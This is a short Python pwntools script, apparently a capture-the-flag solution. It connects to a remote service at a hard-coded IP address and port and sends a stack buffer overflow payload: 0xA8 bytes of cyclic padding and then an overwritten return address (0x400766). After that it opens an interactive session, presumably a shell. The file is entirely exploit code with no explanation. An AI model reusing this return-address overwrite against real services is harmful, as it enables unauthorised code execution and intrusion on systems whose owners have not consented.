from pwn import *

# sh = process('./pwn2')
sh = remote("61.147.171.105", 56876)

payload = cyclic(0xA8)
payload += p64(0x400766)
sh.recv()
sh.sendline(payload)
sh.interactive()